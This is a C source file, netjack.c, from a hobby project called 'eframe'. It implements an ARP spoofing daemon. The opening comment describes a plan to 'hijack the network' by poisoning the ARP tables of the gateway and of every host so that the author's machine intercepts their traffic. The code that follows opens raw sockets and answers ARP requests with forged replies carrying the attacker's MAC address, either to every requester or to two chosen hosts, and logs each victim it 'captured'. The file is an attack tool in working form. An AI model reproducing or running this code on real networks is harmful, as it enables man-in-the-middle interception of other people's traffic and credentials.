/*      netjack.c               July 25, 2013           project eframe

    contains functions to spoof the entire network. Hijack the network.
    The key to creating a successful daemon is realizing that the gateway
    (router) rarely uses an arp broadcast to get MAC addresses updated. 
    This is because a connection is already in place. It doesn't need
    to ask the network for a MAC address it already has. It just needs
    to verify the information is correct.

    This is why when you spoof an IP and don't forward the traffic,
    machines on the network start to send out more far reaching requests.
    The router will first try the mac address that it has a couple times.
    If it can't get any response after a long time, it might send a broad-
    cast.

    With this in mind, it is IMPOSSIBLE to establish a daemon that will
    get in between a target computer and the router without specifying
    the gateway mac address and poisoning both the gateway and target.
    with your own program.  

    In order to hijack the network, you need to throw every machine on it
    off their game. If you scramble their arp tables, they will hurry to 
    fix it by sending out broadcasts. If you have the daemon in place
    while all these machines are scrambling to fix their arp tables, 
    you can effectively jump in the router's spot for each machine.

    So you could spam to each possible IP on the network an arp response
    stating you are the gateway ip. Then the daemon just has t intercept
    any updates being requested to ensure they stay poisoned.

    This doesn't solve how to fix the gateway, though. Modern routers will
    simply send an arp request to their previous known ip for a given machine
    rather than broadcast it. Broadcast's usually a last resort.

    So you would have to spoof each machine's ip to the router as well. This
    is becoming too much headache for what it's worth. 

    The problem is, I don't like the idea of just spamming arp poison. It
    draws way too much attention and is sloppy. Besides, it may not capture
    100% of all packets because arp tables might correct for a little bit
    before your new round of poison goes out.

    After some thought, I now see I could just send a bunch of ARP responses
    to EVERY IP in the subnet. I do this by sending to broadcast mac ff-ff-ff...
    saying I am the IP in a counter 0, 1, 2, 3, 4, etc. This works because
    an ARP response is just going to overwrite the mac address for a given
    mac address in their local ARP table. So if I spam my mac address to 
    every NIC on the network saying I am each IP in the network, they will
    eventually try to self correct, at which point I have the daemon working.

    A few things to improve this project some day:

        - find the gateway IP and MAC in the local ARP cache. Now the user
          doesn't have to supply this. Also, you can give feedback on gateway
          activity by the name "gateway" rather than by an IP address
        - keep local cache rspnss from sudo eframe -i ethX -req 255.255.255.255
          Use this local cache to auto-generate poison packets to whole ntwrk.
          This was original intent for -netjack. Alternatively, just send
          poison packets to every IP in the subnet spoofing as GATEWAY. 
          Send responses to GATEWAY posing as every other IP.
        - 
                                                                        */
     #include "netjack.h"           // include self
     #include <arpa/inet.h>
     #include <linux/if_packet.h>
     #include <string.h>
     #include <stdlib.h>
     #include <net/if.h>
     #include <netinet/ether.h>

     #include <stdio.h>
     #include <unistd.h>
     #include <net/if.h>  
     #include <netinet/in.h>
     #include <sys/ioctl.h>
     #include <sys/types.h>
     #include <sys/socket.h>
                                                                       
    struct arp_hdr
    {
        uint16_t hw_type; // hardware type
        uint16_t proto_type; // protocol type
        uint8_t ha_len; // hardware address length
        uint8_t pa_len; // protocol address length
        uint16_t ar_op; // arp opcode
        uint8_t source_mac[ETH_ALEN]; // source mac
        uint8_t source_ip[IP_ALEN]; // source ip
        uint8_t dest_mac[ETH_ALEN]; // destination mac
        uint8_t dest_ip[IP_ALEN]; // destination ip
    };


     int ARP_Daemon(char * ifName, int *mac_1, int *ip_1, int *ip_2, int *mac_2, int i_mode)
     {
         int sockrd;
         unsigned int i;
         int packetsize = sizeof(struct ether_header) + sizeof(struct arp_hdr);
         char packet[packetsize];      // buffer for packet reads
         // *ah ties the buffer for reading to eth headers
         unsigned char arp_packet[packetsize];
         struct ether_header *ah = (struct ether_header *) packet;
         struct arp_hdr *arp = (struct arp_hdr *)(packet + sizeof(struct ether_header));
         struct ether_header *spoof_ah = (struct ether_header *)arp_packet;
         struct arp_hdr *spoof_arp = (struct arp_hdr *)(arp_packet + sizeof(struct ether_header));
         struct sockaddr_ll socket_address;

         int sockfd;
         struct ifreq if_idx;
         struct ifreq if_mac;
         int tx_len = 0;

         /* Open RAW socket to send on */
         if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
         {
             perror("socket");
         }

         /* construct the headers */
         memset(packet, 0, packetsize);
         memset(arp_packet, 0, packetsize);

         /* Get the index of the interface to send on */
         memset(&if_idx, 0, sizeof(struct ifreq));
         strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
         if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
             perror("SIOCGIFINDEX");

         /* Get the MAC address of the interface to send on */
         memset(&if_mac, 0, sizeof(struct ifreq));
         strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
         if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
             perror("SIOCGIFHWADDR");

         // collect source ip only once to avoid waste in the loop   
         int source_ip[4] = { 0, 0, 0, 0 };
         if(Get_IP(ifName, source_ip) != 0)
         {
             printf("Failed to collect IP.\n");
             return -1;
         }


         /* Open RAW socket to read on */
         if ((sockrd = socket(AF_PACKET, SOCK_PACKET, htons(ETH_P_ARP))) < 0) {
             perror("socket");
         }
         i = 0;
         printf("starting arp spoof daemon....\n");
         for(;;)
         {
             /* Incoming ARP reads */
             read(sockrd, packet, packetsize);
             //printf("ah->ether_type: ");//, ah->ether_type);

             printf("Incoming ARP Packet: %d\n", arp->ar_op);
             if(ah->ether_type == 1544 && (arp->ar_op == 256))
             {                                             // 2 = ARPOP_REQUEST

                 switch(i_mode)
                 {
                    case 0:
                        // ether header
                        memcpy(spoof_ah->ether_dhost, ah->ether_shost, ETH_ALEN);
                        spoof_ah->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
                        spoof_ah->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
                        spoof_ah->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
                        spoof_ah->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
                        spoof_ah->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
                        spoof_ah->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
                        spoof_ah->ether_type = htons(ETHERTYPE_ARP);
                        
                        // arp header
                        spoof_arp->hw_type = arp->hw_type; // for some reason
                        spoof_arp->proto_type = arp->proto_type; // these are not being written into the packet
                        spoof_arp->ha_len = ETH_ALEN;
                        spoof_arp->pa_len = IP_ALEN;
                        spoof_arp->ar_op = htons(ARPOP_REPLY);
                        memcpy(spoof_arp->source_mac, spoof_ah->ether_shost, ETH_ALEN);
                        memcpy(spoof_arp->source_ip, arp->dest_ip, IP_ALEN);
                        memcpy(spoof_arp->dest_mac, arp->source_mac, ETH_ALEN);
                        memcpy(spoof_arp->dest_ip, arp->source_ip, IP_ALEN);
                        /* Index of the network device */
                        socket_address.sll_ifindex = if_idx.ifr_ifindex;
                        /* Address length*/
                        socket_address.sll_halen = ETH_ALEN;


                        memcpy(socket_address.sll_addr, spoof_arp->dest_mac, ETH_ALEN);
                        
                        /* Send packet */
                        if (sendto(sockfd, arp_packet, packetsize, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
                        {
                            printf("Send failed\n");
                            close(sockfd);
                            close(sockrd);
                            return -1;
                        } 
                        printf("Captured: %d.%d.%d.%d thinks you are %d.%d.%d.%d\n", spoof_arp->dest_ip[0], spoof_arp->dest_ip[1],spoof_arp->dest_ip[2], spoof_arp->dest_ip[3], spoof_arp->source_ip[0],spoof_arp->source_ip[1],spoof_arp->source_ip[2],spoof_arp->source_ip[3]);
                        //printf("IP destination: %d.%d.%d.%d", spoof_ah->ether_dhost[0], spoof_ah->ether_dhost[1], spoof_ah->ether_dhost[2], spoof_ah->ether_dhost[3]);
                        //printf("IP spoof: %d.%d.%d.%d\n", ip_2[0],ip_2[1],ip_2[2],ip_2[3]);

                        break;
                    case 2:
                        printf("%d\t", i);
                        printf("%d\t", memcmp(ah->ether_shost, mac_1, ETH_ALEN));

                        printf("MAC destination: %.02x-%.02x-%.02x-%.02x-%.02x-%.02x\t", ah->ether_shost[0], ah->ether_shost[1], ah->ether_shost[2], ah->ether_shost[3], ah->ether_shost[4], ah->ether_shost[5]);
                        printf("MAC destination: %.02x-%.02x-%.02x-%.02x-%.02x-%.02x\n", mac_1[0], mac_1[1], mac_1[2], mac_1[3], mac_1[4], mac_1[5]);
                        if(memcmp(ah->ether_shost, mac_1, ETH_ALEN) == 0)
                        {
                            // ether header
                            memcpy(spoof_ah->ether_dhost, ah->ether_shost, ETH_ALEN);
                            spoof_ah->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
                            spoof_ah->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
                            spoof_ah->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
                            spoof_ah->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
                            spoof_ah->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
                            spoof_ah->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
                            spoof_ah->ether_type = htons(ETHERTYPE_ARP);
                            
                            // arp header
                            spoof_arp->hw_type = 1;
                            spoof_arp->proto_type = htons(ETH_P_IP);
                            spoof_arp->ha_len = ETH_ALEN;
                            spoof_arp->pa_len = IP_ALEN;
                            spoof_arp->ar_op = htons(ARPOP_REPLY);
                            memcpy(spoof_arp->source_mac,  spoof_ah->ether_shost, ETH_ALEN);
                            memcpy(spoof_arp->source_ip,  arp->dest_ip, IP_ALEN);
                            memcpy(spoof_arp->dest_mac, arp->source_mac, ETH_ALEN);
                            memcpy(spoof_arp->dest_ip, arp->source_ip, IP_ALEN);

                            memcpy(socket_address.sll_addr, spoof_arp->dest_mac, ETH_ALEN);
                            /* Index of the network device */
                            socket_address.sll_ifindex = if_idx.ifr_ifindex;
                            /* Address length*/
                            socket_address.sll_halen = ETH_ALEN;

                            socket_address.sll_addr[0] = spoof_arp->dest_mac[0]; 
                            socket_address.sll_addr[1] = spoof_arp->dest_mac[1]; 
                            socket_address.sll_addr[2] = spoof_arp->dest_mac[2]; 
                            socket_address.sll_addr[3] = spoof_arp->dest_mac[3]; 
                            socket_address.sll_addr[4] = spoof_arp->dest_mac[4]; 
                            socket_address.sll_addr[5] = spoof_arp->dest_mac[5]; 

                            printf("spoof_arp->dest_mac: %.02X-%.02X-%.02X-%.02X-%.02X-%.02X\n", spoof_arp->dest_mac[0], spoof_arp->dest_mac[1],spoof_arp->dest_mac[2],spoof_arp->dest_mac[3],spoof_arp->dest_mac[4],spoof_arp->dest_mac[5]);
                            /* Send packet */
                            if (sendto(sockfd, arp_packet, packetsize, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
                            {
                                printf("Send failed\n");
                                close(sockfd);
                                close(sockrd);
                                return -1;
                            } 
                            printf("IP destination: %d.%d.%d.%d\t", ip_1[0],ip_1[1],ip_1[2],ip_1[3]);
                            printf("IP spoof: %d.%d.%d.%d\n", ip_2[0],ip_2[1],ip_2[2],ip_2[3]);

                        }
                        else if(memcmp(ah->ether_shost, mac_2, ETH_ALEN) == 0)
                        {
                            // ether header
                            memcpy(spoof_ah->ether_dhost, ah->ether_shost, ETH_ALEN);
                            spoof_ah->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
                            spoof_ah->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
                            spoof_ah->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
                            spoof_ah->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
                            spoof_ah->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
                            spoof_ah->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
                            spoof_ah->ether_type = htons(ETHERTYPE_ARP);

                            // ARP header
                            spoof_arp->hw_type = 1;
                            spoof_arp->proto_type = htons(ETH_P_IP);
                            spoof_arp->ha_len = ETH_ALEN;
                            spoof_arp->pa_len = IP_ALEN;
                            spoof_arp->ar_op = htons(ARPOP_REPLY);
                            memcpy(spoof_arp->source_mac, spoof_ah->ether_shost, ETH_ALEN);
                            memcpy(spoof_arp->source_ip, arp->dest_ip, IP_ALEN);
                            memcpy(spoof_arp->dest_mac, arp->source_mac, ETH_ALEN);
                            memcpy(spoof_arp->dest_ip, arp->source_ip, IP_ALEN);
                            /* Index of the network device */
                            socket_address.sll_ifindex = if_idx.ifr_ifindex;
                            /* Address length*/
                            socket_address.sll_halen = ETH_ALEN;


                            memcpy(socket_address.sll_addr, spoof_arp->dest_mac, ETH_ALEN);

                            /* Send packet */
                            if (sendto(sockfd, arp_packet, packetsize, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
                            {
                                printf("Send failed\n");
                                close(sockfd);
                                close(sockrd);
                                return -1;
                            } 
                            printf("IP destination: %d.%d.%d.%d\t", ip_1[0],ip_1[1],ip_1[2],ip_1[3]);
                            printf("IP spoof: %d.%d.%d.%d\n", ip_2[0],ip_2[1],ip_2[2],ip_2[3]);

                        }
                        break;
                 }
                 i++;
             }
         }

         close(sockrd);
         close(sockfd);
         return 0;
     }

